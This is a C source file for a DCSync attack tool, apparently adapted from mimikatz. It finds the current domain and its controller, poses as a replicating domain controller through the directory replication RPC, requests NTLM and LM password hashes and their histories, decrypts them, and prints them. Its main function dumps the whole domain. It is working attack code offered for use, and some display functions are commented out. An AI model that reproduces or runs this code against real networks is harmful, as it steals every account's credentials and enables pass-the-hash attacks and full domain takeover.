#pragma once

#include "globals.h"
#include "rpc.h"
#include "drsr.h"

LPCSTR dcsync_oids[] = {
	szOID_ANSI_name,
	szOID_ANSI_sAMAccountName, szOID_ANSI_userPrincipalName, szOID_ANSI_sAMAccountType,
	szOID_ANSI_userAccountControl, szOID_ANSI_accountExpires, szOID_ANSI_pwdLastSet,
	szOID_ANSI_objectSid, szOID_ANSI_sIDHistory,
	szOID_ANSI_unicodePwd, szOID_ANSI_ntPwdHistory, szOID_ANSI_dBCSPwd, szOID_ANSI_lmPwdHistory, szOID_ANSI_supplementalCredentials,
	szOID_ANSI_trustPartner, szOID_ANSI_trustAuthIncoming, szOID_ANSI_trustAuthOutgoing,
	szOID_ANSI_currentValue,
	szOID_isDeleted,
};
LPCSTR dcsync_oids_export[] = {
	szOID_ANSI_name,
	szOID_ANSI_sAMAccountName, szOID_ANSI_objectSid,
	szOID_ANSI_userAccountControl,
	szOID_ANSI_unicodePwd,
	szOID_isDeleted,
};

const wchar_t* UF_FLAG[32] = {
	L"SCRIPT", L"ACCOUNTDISABLE", L"0x4 ?", L"HOMEDIR_REQUIRED", L"LOCKOUT", L"PASSWD_NOTREQD", L"PASSWD_CANT_CHANGE", L"ENCRYPTED_TEXT_PASSWORD_ALLOWED",
	L"TEMP_DUPLICATE_ACCOUNT", L"NORMAL_ACCOUNT", L"0x400 ?", L"INTERDOMAIN_TRUST_ACCOUNT", L"WORKSTATION_TRUST_ACCOUNT", L"SERVER_TRUST_ACCOUNT", L"0x4000 ?", L"0x8000 ?",
	L"DONT_EXPIRE_PASSWD", L"MNS_LOGON_ACCOUNT", L"SMARTCARD_REQUIRED", L"TRUSTED_FOR_DELEGATION", L"NOT_DELEGATED", L"USE_DES_KEY_ONLY", L"DONT_REQUIRE_PREAUTH", L"PASSWORD_EXPIRED",
	L"TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION", L"NO_AUTH_DATA_REQUIRED", L"PARTIAL_SECRETS_ACCOUNT", L"USE_AES_KEYS", L"0x10000000 ?", L"0x20000000 ?", L"0x40000000 ?", L"0x80000000 ?",
};

BOOL getDC(LPCWSTR fullDomainName, DWORD altFlags, LPWSTR* fullDCName)
{
	BOOL status = FALSE;
	DWORD ret, size;
	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
	ret = DsGetDcName(NULL, fullDomainName, NULL, NULL, altFlags | DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
	if (ret == ERROR_SUCCESS)
	{
		size = (DWORD)(wcslen(cInfo->DomainControllerName + 2) + 1) * sizeof(wchar_t);
		if (*fullDCName = (wchar_t*)LocalAlloc(LPTR, size))
		{
			status = TRUE;
			RtlCopyMemory(*fullDCName, cInfo->DomainControllerName + 2, size);
		}
		NetApiBufferFree(cInfo);
	}
	else PRINT_ERROR(L"DsGetDcName: %u\n", ret);
	return status;
}

BOOL getCurrentDomainInfo(PPOLICY_DNS_DOMAIN_INFO* pDomainInfo)
{
	BOOL status = FALSE;
	LSA_HANDLE hLSA;
	LSA_OBJECT_ATTRIBUTES oaLsa = { 0 };

	if (NT_SUCCESS(LsaOpenPolicy(NULL, &oaLsa, POLICY_VIEW_LOCAL_INFORMATION, &hLSA)))
	{
		status = NT_SUCCESS(LsaQueryInformationPolicy(hLSA, PolicyDnsDomainInformation, (PVOID*)pDomainInfo));
		LsaClose(hLSA);
	}

	return status;
}

BOOL decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
{
	DWORD i;
	BOOL status = FALSE;
	BYTE data[LM_NTLM_HASH_LENGTH];
	for (i = 0; i < encodedDataSize; i += LM_NTLM_HASH_LENGTH)
	{
		status = NT_SUCCESS(RtlDecryptDES2blocks1DWORD(encodedData + i, &rid, data));
		if (status)
		{
			if (isHistory)
				PRINT_NORMAL(L"    %s-%2u: ", prefix, i / LM_NTLM_HASH_LENGTH);
			else
				PRINT_NORMAL(L"  Hash %s: ", prefix);
			wprintf_hex(data, LM_NTLM_HASH_LENGTH, 0);
			PRINT_NORMAL(L"\n");
		}
		else PRINT_ERROR(L"Error in RtlDecryptDES2blocks1DWORD");
	}
	return status;
}

void descrUser(SCHEMA_PREFIX_TABLE* prefixTable, ATTRBLOCK* attributes)
{
	DWORD rid = 0, i;
	PBYTE encodedData;
	DWORD encodedDataSize;
	PVOID data;
	ATTRVALBLOCK* sids;

	findPrintMonoAttr(L"SAM Username         : ", prefixTable, attributes, szOID_ANSI_sAMAccountName, TRUE);
	findPrintMonoAttr(L"User Principal Name  : ", prefixTable, attributes, szOID_ANSI_userPrincipalName, TRUE);

	// TODO: Implement these functions
	/*if (findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountType, &data, NULL))
		PRINT_NORMAL(L"Account Type         : %08x ( %s )\n", *(PDWORD)data, kuhl_m_lsadump_samAccountType_toString(*(PDWORD)data));*/

	if (findMonoAttr(prefixTable, attributes, szOID_ANSI_userAccountControl, &data, NULL))
	{
		PRINT_NORMAL(L"User Account Control : %08x ( ", *(PDWORD)data);
		for (i = 0; i < min(ARRAYSIZE(UF_FLAG), sizeof(DWORD) * 8); i++)
			if ((1 << i) & *(PDWORD)data)
				PRINT_NORMAL(L"%s ", UF_FLAG[i]);
		PRINT_NORMAL(L")\n");
	}

	/*if (findMonoAttr(prefixTable, attributes, szOID_ANSI_accountExpires, &data, NULL))
	{
		PRINT_NORMAL(L"Account expiration   : ");
		displayLocalFileTime((LPFILETIME)data);
		PRINT_NORMAL(L"\n");
	}

	if (findMonoAttr(prefixTable, attributes, szOID_ANSI_pwdLastSet, &data, NULL))
	{
		PRINT_NORMAL(L"Password last change : ");
		displayLocalFileTime((LPFILETIME)data);
		PRINT_NORMAL(L"\n");
	}*/

	if (sids = findAttr(prefixTable, attributes, szOID_ANSI_sIDHistory))
	{
		PRINT_NORMAL(L"SID history:\n");
		for (i = 0; i < sids->valCount; i++)
		{
			PRINT_NORMAL(L"  ");
			displaySID(sids->pAVal[i].pVal);
			PRINT_NORMAL(L"\n");
		}
	}

	if (findMonoAttr(prefixTable, attributes, szOID_ANSI_objectSid, &data, NULL))
	{
		PRINT_NORMAL(L"Object Security ID   : ");
		displaySID(data);
		PRINT_NORMAL(L"\n");
		rid = *GetSidSubAuthority(data, *GetSidSubAuthorityCount(data) - 1);
		PRINT_NORMAL(L"Object Relative ID   : %u\n", rid);

		PRINT_NORMAL(L"\nCredentials:\n");
		if (findMonoAttr(prefixTable, attributes, szOID_ANSI_unicodePwd, &encodedData, &encodedDataSize))
			decrypt(encodedData, encodedDataSize, rid, L"NTLM", FALSE);
		if (findMonoAttr(prefixTable, attributes, szOID_ANSI_ntPwdHistory, &encodedData, &encodedDataSize))
			decrypt(encodedData, encodedDataSize, rid, L"ntlm", TRUE);
		if (findMonoAttr(prefixTable, attributes, szOID_ANSI_dBCSPwd, &encodedData, &encodedDataSize))
			decrypt(encodedData, encodedDataSize, rid, L"LM  ", FALSE);
		if (findMonoAttr(prefixTable, attributes, szOID_ANSI_lmPwdHistory, &encodedData, &encodedDataSize))
			decrypt(encodedData, encodedDataSize, rid, L"lm  ", TRUE);
	}

	/*if (findMonoAttr(prefixTable, attributes, szOID_ANSI_supplementalCredentials, &encodedData, &encodedDataSize))
	{
		PRINT_NORMAL(L"\nSupplemental Credentials:\n");
		descrUserProperties((PUSER_PROPERTIES)encodedData);
	}*/
}

void descrObject(SCHEMA_PREFIX_TABLE* prefixTable, ATTRBLOCK* attributes, LPCWSTR szSrcDomain, BOOL someExport)
{
	if (findMonoAttr(prefixTable, attributes, szOID_ANSI_sAMAccountName, NULL, NULL))
	{
		findPrintMonoAttr(L"\n\nObject RDN           : ", prefixTable, attributes, szOID_ANSI_name, TRUE);
		descrUser(prefixTable, attributes);
	}
}

int dcsync(BOOL allData, LPCWSTR szUser, LPCWSTR szGuid)
{
	LPCWSTR szDomain = NULL, szDc = NULL, szService = NULL;
	DSNAME dsName = { 0 };
	LPDWORD pMajor, pMinor, pBuild;
	PPOLICY_DNS_DOMAIN_INFO pDomainInfo = NULL;
	RPC_BINDING_HANDLE hBinding;
	DRS_MSG_GETCHGREQ getChReq = { 0 };
	DRS_MSG_GETCHGREPLY getChRep;
	DRS_EXTENSIONS_INT DrsExtensionsInt;
	DRS_HANDLE hDrs = NULL;
	DWORD i, dwOutVersion = 0;
	ULONG drsStatus;

	getCurrentDomainInfo(&pDomainInfo);
	szDomain = pDomainInfo->DnsDomainName.Buffer;
	PRINT_INFO(L"Domain would be %s\n", szDomain);

	getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &szDc);
	PRINT_INFO(L"DC would be %s\n", szDc);

	szService = L"ldap";
	RtlGetNtVersionNumbers(&pMajor, &pMinor, &pBuild);
	createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, (pMajor < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, RpcSecurityCallback);
	getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt);

	if (DrsExtensionsInt.dwReplEpoch)
		PRINT_INFO(L"DS Replication Epoch is %u\n", DrsExtensionsInt.dwReplEpoch);

	getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs, &DrsExtensionsInt);
	getChReq.V8.pNC = &dsName;
	getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
	getChReq.V8.cMaxObjects = (allData ? 1000 : 1);
	getChReq.V8.cMaxBytes = 0x00a00000; // 10M
	getChReq.V8.ulExtendedOp = (allData ? 0 : EXOP_REPL_OBJ);
	getChReq.V8.pPartialAttrSet = (PARTIAL_ATTR_VECTOR_V1_EXT*)MIDL_user_allocate(sizeof(PARTIAL_ATTR_VECTOR_V1_EXT) + sizeof(ATTRTYP) * ((allData ? ARRAYSIZE(dcsync_oids_export) : ARRAYSIZE(dcsync_oids)) - 1));
	getChReq.V8.pPartialAttrSet->dwVersion = 1;
	getChReq.V8.pPartialAttrSet->dwReserved1 = 0;
	if (allData)
	{
		getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(dcsync_oids_export);
		for (i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
			MakeAttid(&getChReq.V8.PrefixTableDest, dcsync_oids_export[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
	}
	else
	{
		getChReq.V8.pPartialAttrSet->cAttrs = ARRAYSIZE(dcsync_oids);
		for (i = 0; i < getChReq.V8.pPartialAttrSet->cAttrs; i++)
			MakeAttid(&getChReq.V8.PrefixTableDest, dcsync_oids[i], &getChReq.V8.pPartialAttrSet->rgPartialAttr[i], TRUE);
	}

	RpcTryExcept
	{
		do
		{
			RtlZeroMemory(&getChRep, sizeof(DRS_MSG_GETCHGREPLY));
			drsStatus = IDL_DRSGetNCChanges(hDrs, 8, &getChReq, &dwOutVersion, &getChRep);
			if (drsStatus == 0)
			{
				if (dwOutVersion == 6 && (allData || getChRep.V6.cNumObjects == 1))
				{
					if (ProcessGetNCChangesReply(&getChRep.V6.PrefixTableSrc, getChRep.V6.pObjects))
					{
						REPLENTINFLIST* pObject = getChRep.V6.pObjects;
						for (i = 0; i < getChRep.V6.cNumObjects; i++)
						{
							descrObject(&getChRep.V6.PrefixTableSrc, &pObject[0].Entinf.AttrBlock, szDomain, NULL);
							pObject = pObject->pNextEntInf;
						}
					}
					else
					{
						PRINT_ERROR(L"Error in ProcessGetNCChangesReply\n");
						break;
					}
					if (allData)
					{
						RtlCopyMemory(&getChReq.V8.uuidInvocIdSrc, &getChRep.V6.uuidInvocIdSrc, sizeof(UUID));
						RtlCopyMemory(&getChReq.V8.usnvecFrom, &getChRep.V6.usnvecTo, sizeof(USN_VECTOR));
					}
				}
				else
					PRINT_ERROR(L"DRSGetNCChanges, invalid dwOutVersion (%u) and/or cNumObjects (%u)\n", dwOutVersion, getChRep.V6.cNumObjects);
				free_DRS_MSG_GETCHGREPLY_data(dwOutVersion, &getChRep);
			}
			else
				PRINT_ERROR(L"GetNCChanges: 0x%08x (%u)\n", drsStatus, drsStatus);			
		}
		while (getChRep.V6.fMoreData);
		IDL_DRSUnbind(&hDrs);
	}
	RpcExcept(RPC_EXCEPTION)
		PRINT_ERROR(L"RPC Exception 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
	RpcEndExcept

	free_SCHEMA_PREFIX_TABLE_data(&getChReq.V8.PrefixTableDest);
	MIDL_user_free(getChReq.V8.pPartialAttrSet);
	deleteBinding(&hBinding);
	LsaFreeMemory(pDomainInfo);

	return 1;
}

int main(int argc, wchar_t* argv[])
{
	asn1_init();
	dcsync(TRUE, NULL, NULL);

}

